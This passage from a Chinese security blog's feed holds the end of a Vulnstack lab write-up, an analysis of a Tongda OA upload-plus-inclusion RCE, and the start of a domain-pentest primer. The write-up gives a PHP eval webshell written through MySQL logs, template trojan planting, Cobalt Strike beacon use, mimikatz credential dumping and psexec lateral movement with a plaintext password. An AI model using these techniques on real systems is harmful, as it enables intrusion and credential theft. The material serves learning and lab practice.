<code>secure_file_priv =</code></p><p>保存，重启mysql。</p><p><strong>Linux</strong>下:</p><p>在<code>/etc/my.cnf</code>的<code>[mysqld]</code>下面添加<code>local-infile=0</code>选项。</p><p>这里无法直接写shell，那我们来尝试日志写 <code>shell</code>，开启日志记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;; # 开启日志记录</span><br><span class="line">show variables like &#39;general%&#39;; # 查看当前的日志记录</span><br><span class="line">set global general_log_file&#x3D;&quot;C:&#x2F;&#x2F;phpStudy&#x2F;www&#x2F;v0w.php&quot;;  # 指定日志文件</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719170708.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719171124.png" style="zoom:50%;" /><p>进行一次查询，查询记录就将写到日志文件中，形成一个webshell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php eval($_POST[&quot;v0w&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719171314.png" style="zoom:50%;" /><p>使用蚁剑连接，getshell。</p><img src="http://image.v0w.top/Blog/20200719171508.png" style="zoom: 80%;" /><h3 id="3-2-2-通过yxcms-getshell"><a href="#3-2-2-通过yxcms-getshell" class="headerlink" title="3.2.2 通过yxcms getshell"></a>3.2.2 通过yxcms getshell</h3><p>利用之前得到的一些信息，登录后台</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后台地址：&#x2F;index.php?r&#x3D;admin</span><br><span class="line">用户名和密码：admin  123456</span><br></pre></td></tr></table></figure><p>看看有没有上传或者什么可以写入shell的地方。可以通过Seay审计工具来进行比较细致的审计 ，不过我们不用工具，也容易找到前台模板的管理页面存在编辑功能，明显的写shell的地方。</p><p>比如随便找一个模板进行修改，插入一句话木马（虽然是随便找的，但是需要知道，这个模板在哪个网页执行）</p><img src="http://image.v0w.top/Blog/20200719173829.png" style="zoom:80%;" /><p>这个很明显就在<code>index.php</code>处的搜索功能。</p><p>比如我们随便搜索一个关键词，就会触发这个shell。再或者通过下载下来的备份文件搜索这个文件，直接访问到这个文件的路径也可以拿下shell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;index.php?r&#x3D;default%2Findex%2Fsearch&amp;keywords&#x3D;q&amp;type&#x3D;all</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;index_search.php</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719175223.png" style="zoom: 50%;" /><h1 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h1><h2 id="4-1-将web服务器上线到CS"><a href="#4-1-将web服务器上线到CS" class="headerlink" title="4.1 将web服务器上线到CS"></a>4.1 将web服务器上线到CS</h2><p>将刚才生成的<code>beacon.exe</code>上传到web目录，然后在shell中执行这个exe,就可以将shell上线到CS了。</p><img src="http://image.v0w.top/Blog/20200719192123.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719193327.png" style="zoom:50%;" /><h2 id="4-2-目标主机信息收集"><a href="#4-2-目标主机信息收集" class="headerlink" title="4.2 目标主机信息收集"></a>4.2 目标主机信息收集</h2><p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢</p><p>我这是自己的内网且没有杀软我就设置为 0 了，真实环境不要设置这么低</p><p>进入 <code>beacon</code> 执行 <code>sleep 0</code>，然后查看下基本的本机信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719194054.png" style="zoom:80%;" /><p><code>systeminfo</code> 可以查看系统详细信息，提供两个小 <code>tips</code>:</p><p>查看是什么操作系统 &amp; 系统版本：<br>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code><br>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p><img src="http://image.v0w.top/Blog/20200719195546.png" style="zoom:80%;" /><p>查询已安装的软件及版本信息：<code>wmic product get name,version</code></p><img src="http://image.v0w.top/Blog/20200719195654.png" style="zoom:80%;" /><p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p><p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure><p>查询进程及服务：<br><code>tasklist</code>，默认显示映像名称，PID，会话名，会话，内存使用</p><img src="http://image.v0w.top/Blog/20200719195906.png" style="zoom:80%;" /><p><code>tasklist /svc</code>，默认显示映像名称，PID，服务</p><img src="http://image.v0w.top/Blog/20200719195927.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719200121.png" style="zoom:80%;" /><p>常见的杀软进程：</p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h2 id="4-3-域信息收集"><a href="#4-3-域信息收集" class="headerlink" title="4.3 域信息收集"></a>4.3 域信息收集</h2><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>参考文章：<a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p><blockquote><p>域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 从 Windows Server 2003 开始 ， Active Directory 是负责维护该中央数据库的 Windows 组件。Windows 域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p></blockquote><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>使用 <code>ipconfig /all</code> 查看 <code>DNS</code> 服务器：</p><p><img src="http://image.v0w.top/Blog/20200719200858.png"></p><p>发现 DNS 服务器名为 <code>god.org</code>，查看域信息：<code>net view</code></p><img src="http://image.v0w.top/Blog/20200719201026.png" style="zoom:80%;" /><p>查看主域信息：<code>net view /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719201134.png"></p><p>查看时间服务器：<code>net time /domain</code></p><img src="http://image.v0w.top/Blog/20200719201254.png"  /><p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p><p>查询当前的登录域与用户信息：<code>net config workstation</code></p><p><img src="http://image.v0w.top/Blog/20200719201432.png"></p><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>利用 <code>nslookup</code> 命令直接解析域名服务器：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell nslookup god.org# nslookup 域名</span><br></pre></td></tr></table></figure><h3 id="查询域控和用户信息"><a href="#查询域控和用户信息" class="headerlink" title="查询域控和用户信息"></a>查询域控和用户信息</h3><p>查看当前域的所有用户：<code>net user /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202425.png"></p><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p>可以获取到用户名，描述信息，SID 域名等：</p><img src="http://image.v0w.top/Blog/20200719202526.png" style="zoom:80%;" /><p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202617.png"></p><p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202708.png"></p><p>获取域密码信息：<code>net accounts /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202902.png"></p><p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p><p>以下为win7中的执行结果：</p><p><img src="http://image.v0w.top/Blog/20200719203041.png"></p><h2 id="4-4-横向探测"><a href="#4-4-横向探测" class="headerlink" title="4.4 横向探测"></a>4.4 横向探测</h2><p>获取到一个 <code>cs</code> 的 <code>beacon</code> 后可以继续查看目标内网情况和端口开放情况</p><p>在 <code>beacon</code> 上右键 -&gt; 目标 -&gt; 选择 <code>net view</code> 或者 <code>port scan（端口扫描）</code>:</p><p><strong>net view</strong></p><img src="http://image.v0w.top/Blog/20200719203320.png" style="zoom:80%;" /><p>执行之后，可以在<code>CobaltStrike-&gt;可视化-&gt;目标列表</code>看到扫描出来的主机：</p><p><img src="http://image.v0w.top/Blog/20200719203856.png"></p><p>用 <code>cs</code> 的 <code>hashdump</code> 读内存密码：<code>hashdump</code>，</p><p>用 <code>mimikatz</code> 读注册表密码：<code>logonpasswords</code></p><img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;" /><p>在凭证信息一栏可以清楚查看：</p><img src="http://image.v0w.top/Blog/20200719204108.png" style="zoom: 80%;" /><p>如果权限不够可以提权，自带部分提权POC</p><p><img src="http://image.v0w.top/Blog/20200719205029.png"></p><p><img src="http://image.v0w.top/Blog/20200719205118.png"></p><p>额外的提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p><p>抓取密码后可以先探测内网其他主机：</p><p><code>ping</code> 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719211417.png"></p><p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <code>Ladon</code></p><p><a href="https://github.com/k8gege/Ladon"><strong>Ladon</strong></a>作者是 <code>k8gege</code>，它是一个大型内网渗透扫描器并且支持 <code>cs</code> 脚本形式</p><p><code>cs</code> 要使用的话只需要下载其中的 <code>Ladon.exe</code> 和 <code>Ladon.cna</code> 即可运行基本功能</p><p>详细功能参考官方 <a href="https://github.com/k8gege/Ladon/wiki"><code>wiki</code></a>或<a href="http://k8gege.org/p/648af4b3.html">官方说明文档</a></p><p>将Lodan下载下来后，在客户端的CS中<code>CobaltStrike-&gt;脚本管理器-&gt;Load-&gt;Lodan.cna</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;k8gege&#x2F;Ladon.git</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719212518.png"></p><p>之后就可以愉快的使用了。</p><p>查看帮助：</p><img src="http://image.v0w.top/Blog/20200719212548.png" style="zoom: 80%;" /><p>扫描网段内存活主机信息：<code>Ladon 192.168.72.0/24 OsScan</code></p><p>域探测差不多了还可以使用 <a href="https://github.com/BloodHoundAD/BloodHound"><code>BloodHound</code></a>这款域渗透分析工具来分析攻击路径</p><p>BloodHound 介绍：</p><blockquote><p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p></blockquote><h2 id="4-5-横向移动"><a href="#4-5-横向移动" class="headerlink" title="4.5 横向移动"></a>4.5 横向移动</h2><p>因为192.168.52.0/24段不能直接连接到192.168.237.137(kali地址)，所以需要CS派生smb beacon。让内网的主机连接到win7上。</p><blockquote><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p></blockquote><p>简单来说，SMB Beacon 有两种方式</p><p><strong>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</strong></p><p>新建一个 <code>Listener</code>，<code>payload</code> 设置为 <code>Beacon SMB</code>：</p><p><img src="http://image.v0w.top/Blog/20200719221248.png"></p><p>在已有的 <code>Beacon上</code>右键 <code>Spawn</code>(生成会话 / 派生)，选择创建的 <code>smb beacon</code> 的 <code>listerner</code>:</p><img src="http://image.v0w.top/Blog/20200719220636.png" style="zoom: 80%;" /><p>选择后会反弹一个子会话，在 <code>external</code> 的 <code>ip</code> 后面会有一个链接的小图标：</p><img src="http://image.v0w.top/Blog/20200719220734.png" style="zoom:80%;" /><p><img src="http://image.v0w.top/Blog/20200719220810.png"></p><p>这就是派生的 <code>SMB Beacon</code>，当前没有连接</p><p>可以在主 <code>Beacon</code> 上用 <code>link host</code> 连接它，或者 unlink host 断开它</p><p><img src="http://image.v0w.top/Blog/20200719221018.png"></p><p><strong>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</strong></p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h3 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p><p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p><p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p><img src="http://image.v0w.top/Blog/20200719223832.png" style="zoom: 67%;" /><p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p><p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p><p><img src="http://image.v0w.top/Blog/20200719224006.png"></p><img src="http://image.v0w.top/Blog/20200719224034.png" style="zoom:67%;" /><p>可以看到分别执行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator V0Wldl19980114</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure><p>这几条命令，执行后得到了 <code>ROOT-TVI862UBEH</code> 这台主机的 <code>beacon</code></p><p>如法炮制得到了域控主机 <code>OWA</code> 的 <code>beacon</code>，最终目标视图如下：</p><p><img src="http://image.v0w.top/Blog/20200719224514.png"></p><h3 id="token-窃取"><a href="#token-窃取" class="headerlink" title="token 窃取"></a>token 窃取</h3><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>token</code> 来登录其他主机</p><p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p><p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p><img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;" /><p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p><p><img src="http://image.v0w.top/Blog/20200719225303.png"></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>我们利用mysql日志写shell或者CMS的模板文件写shell轻松拿下Web服务器，再利用Web服务器作为跳板，去横向收集域内主机信息，并利用窃取的凭证横向移动到其他主机，最终实现整个域的控制。</p><h1 id="0xFF-后记与参考链接"><a href="#0xFF-后记与参考链接" class="headerlink" title="0xFF 后记与参考链接"></a>0xFF 后记与参考链接</h1><p>内网渗透的内容很多，完成这个靶机，也只是管中窥豹，发现需要更多的积累和学习，也很感谢很多师傅的博客和笔记，使得我在练习这个靶机的时候轻松很多（<del>其实也没有，依然很累==</del>）0rz。后面希望能够继续更新这个系列，在内网渗透方面也能不断学习，不断成长。</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/231111.html">红日官方WP-ATT&amp;CK实战 | Vulnstack 红队（一）</a></li><li><a href="https://soapffz.com/sec/558.html">soapffz师傅非常详细的ATT&amp;CK 实战 - 红日安全 vulnstack (一)</a></li><li><a href="https://blog.csdn.net/qq_36119192/article/details/103528138">内网渗透实战技巧</a></li><li><a href="https://mp.weixin.qq.com/s/rTfizm_b_c3NRS-37n3zsA">由浅入深的域渗透系列一（上）</a></li><li><a href="https://mp.weixin.qq.com/s/11ImZTDTPAF19moSTynBOA">由浅入深的域渗透系列一（下）</a></li><li><a href="https://www.c0bra.xyz/2019/12/14/Cobalt-Strike%E7%B3%BB%E5%88%979/">Cobalt Strike 系列 9</a></li><li>[第三节 SMB Beacon.md](<a href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82[SMB">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第三节[SMB</a> Beacon].md)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传并利用文件包含导致RCE分析</title>
      <link href="/2020/03/20/TODA-FileUpload-Inclusion-vuln/"/>
      <url>/2020/03/20/TODA-FileUpload-Inclusion-vuln/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>3月13日，通达OA在官方论坛发布通告称，近日接到用户反馈遭到勒索病毒攻击，提示用户注意安全风险，并且于同一天对所有版本发布了<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><p>通过在v11.3版本的测试发现全版本的任意文件上传漏洞结合v11版本的文件包含漏洞可以造成远程命令执行，默认为System权限，恶意攻击者可以成功上传Webshell后门，并进一步释放勒索病毒，危害较大。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="php解密"><a href="#php解密" class="headerlink" title="php解密"></a>php解密</h2><p>环境搭建什么的就不说了，这里采用的是<a href="https://pan.baidu.com/s/127voqNZZJX5NkmuC4Ogfhg">2017的版本</a>，修复前的版本。</p><p><a href="https://www.tongda2000.com/download/2019.php">官网下载</a></p><p>相比于一般的php审计，该项目增加了php的加密。这里因为我也是第一次接触到php加密的文件审计，前期碰壁很多，尝试google了<code>php解密</code>，找到一些工具(如黑刀zend等)，但是并没有用（可能是zend版本的问题，也可能是工具本身的问题，没有深究）</p><p>后来看到一篇关于该漏洞的复现——<a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a>，并询问potatso大佬解密方法后，得到耐心解答0rz，并找到一个在线进行php解密的网站——<a href="http://dezend.qiling.org/free.html">DEPHP解密</a></p><p>另外是一个批量解密的工具，seay神写的<a href="http://www.pc6.com/softview/SoftView_610659.html">SeayDzend</a></p><p>另外了解了关于php加密混淆的几种方法——<a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></p><p>通达OA php代码部分的加密统统采用的是Zend加密。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><code>/webroot/ispirit/im/upload.php</code></p><p>这是一个文件上传的功能点，在未修复版本中，是可以绕过验证，从而达到任意上传的效果。有一个if判断如果<code>$P</code>存在且非空就不需要经过<code>auth.php</code>验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制<code>include_once ‘./auth.php’;</code> 进行登录验证。因上传后的文件不在根目录，所以无法直接利用，因此需要进行文件包含。</p><p><img src="https://i.loli.net/2020/03/24/pg6nPi7X5yu8ewD.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>未修复前，可通过精心构造json进入47行的<code>includ_once</code>进行文件包含。官方在补丁中增加了对”..”的过滤防止用户读取其他目录文件。</p><p><img src="https://i.loli.net/2020/03/26/XukdcjaQRpyoVWt.png" alt="20200326222917.png"></p><h2 id="分析利用链"><a href="#分析利用链" class="headerlink" title="分析利用链"></a>分析利用链</h2><ol><li><p>先判断<code>$P</code>参数是否调用了Session和auth登陆认证，当<code>$P</code>费控时，此处可以绕过<code>auth.php</code>登陆验证</p></li><li><p>判断<code>DEST_UID</code>是否为空，如果<code>$DEST_UID</code>存在<code>,</code>则通过<code>intval</code>获取整数值，<code>$DEST_UID==0</code>且<code>UPLOAD_MODE==2</code>才接受，否则 ID无效。</p></li><li><p><code>$_FILES</code>全局变量大于等于1的时候(就是有文件上传的时候)，会调用upload方法进行处理，这里的文件上传的参数为<code>ATTACHMENT</code></p><p><img src="https://i.loli.net/2020/03/26/gRaE2myBU39GxcW.png" alt="20200326204612.png"></p></li><li><p>跟进发现调用的是<code>\general\appbuilder\modules\appdesign\models\AppUtils.php</code>中用yii框架的upload 函数，找了一下，对后缀名有限制。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">UploadedFile</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadForm</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> UploadedFile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $imageFile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            [[<span class="string">&#x27;imageFile&#x27;</span>], <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;skipOnEmpty&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;extensions&#x27;</span> =&gt; <span class="string">&#x27;png, jpg&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;validate()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;imageFile-&gt;saveAs(<span class="string">&#x27;uploads/&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;baseName . <span class="string">&#x27;.&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;extension);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么就可以在url中传入<code>../</code> 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE。</p></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>*本次复现以通达OAv11.3 版本 为例<br><img src="https://image.3001.net/images/20200319/1584586276_5e72de24f33c1.png!small"></p><p>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code>最后构造的Payload如下<br><img src="https://image.3001.net/images/20200319/1584585871_5e72dc8f606a3.png!small"><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测路径为 attach/im/2003/72566742.a.phtm 但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析</p><p><img src="https://image.3001.net/images/20200319/1584585872_5e72dc902ceb5.png!small"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>打上官方发布的补丁：<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><h1 id="个人观点"><a href="#个人观点" class="headerlink" title="个人观点"></a>个人观点</h1><p>虽然我很菜，但是我个人不喜欢这个官网上的一些内容，主要是想要表现产品的优秀，将顾客的信息公之于众。在其官网上，可以非常容易的找到有哪些企业使用了这个系统。这的确是长了脸面（我们产品很好），但是<strong>没有一个系统是绝对安全的</strong>，这种做法也给这个用户带来的风险, 在黑客进行攻击的时候，这种行为无疑是给攻击者们提供了便利，这大概也是这个勒索病毒横行的原因之一吧。</p><p><img src="https://i.loli.net/2020/03/24/vzEGixBJK2Fbqke.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a> potatso 博客园</li><li><a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></li><li><a href="http://dezend.qiling.org/free.html">DEPHP解密</a></li><li><a href="https://www.freebuf.com/column/230871.html">通达OA任意文件上传和文件包含漏洞导致RCE详细代码审计分析及Poc构造复现</a> freebuf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透入门（一）</title>
      <link href="/2020/03/15/DomainPentest1/"/>
      <url>/2020/03/15/DomainPentest1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近找工作，发现光打CTF不足以应对企业的需求，很多都会问一些内网渗透方面的知识。而我之前内网渗透这一块一直没怎么涉及，虽然有点晚的，但是确实需要补一补，认真学习内网渗透。另外后面打算做成一个系列，内网渗透的入门到实战之类的。</p><h1 id="渗透常见概念"><a href="#渗透常见概念" class="headerlink" title="渗透常见概念"></a>渗透常见概念</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><blockquote><p>​    局域网（Local Area Network, LAN），又称内网。内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p></blockquote><h2 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><blockquote><p>​    域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p></blockquote><blockquote><p>​    域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p></blockquote><blockquote><p>​    域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</p></blockquote><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><blockquote><p>​    不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p></blockquote><blockquote><p>​    